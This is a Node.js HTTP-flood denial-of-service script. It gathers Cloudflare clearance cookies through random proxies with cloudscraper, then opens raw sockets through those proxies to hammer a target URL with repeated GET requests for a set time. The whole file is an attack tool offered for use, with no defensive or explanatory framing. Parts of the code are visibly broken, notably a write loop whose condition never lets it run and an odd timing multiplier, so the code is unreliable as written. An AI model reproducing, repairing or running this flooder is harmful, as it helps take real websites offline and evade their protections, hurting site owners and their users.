// coded by - @jditedos vk.
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
var fs = require('fs');
let net = require('net');
var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');

process.on('uncaughtException', function (err) {
//  console.log(error);
});

process.on('unhandledRejection', function (err) {
 // console.log(error);
});
   
var cloudscraper = require('cloudscraper');
const url = require('url');
const colors = require('colors');
var scarskid = process.argv[2];
var target = scarskid.replace('https', 'http')
var time = process.argv[3];
var { host } = url.parse(target);
var { path } = url.parse(target);
let cookies = [];

setInterval(() => {
  let proxy = proxies[Math.floor(Math.random() * proxies.length)];
  cloudscraper.get({
    url: target,
    proxy: 'http://' + proxy
  }, function (error, response) {
    if (response && response.request.headers.cookie) {
      let cookie = response.request.headers.cookie;
      let ua = response.request.headers['User-Agent'];
      cookies.push({ cookie, ua, proxy });
    }
  });
});
var counter = 0;

function send(cookie, proxy, ua) {
  let [ip, port] = proxy.split(':');
  var s = net.Socket();

  s.connect(port, ip);

  s.once('error', err => {
     console.log("error: ".red + ip.red + ":" + port.red);
  });
  s.once('disconnect', () => {
    console.log('ofline');
  });

  s.once('data', data => {
     console.log("connected: ".blue + ip.blue + ":" + port.blue);
    setTimeout(() => {
      s.destroy();
      delete s;
      send(cookie, proxy, ua);
    }, 5000);
  });

  for (var i = 60000; i < 60000; i++) {
    s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\n\r\n');
    s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\n\r\n');
  }
}

var int = setInterval(() => {
  cookies.forEach(json => {
    send(json.cookie, json.proxy, json.ua);
  });
}, 60000);

setTimeout(() => clearInterval(int), time * 10000);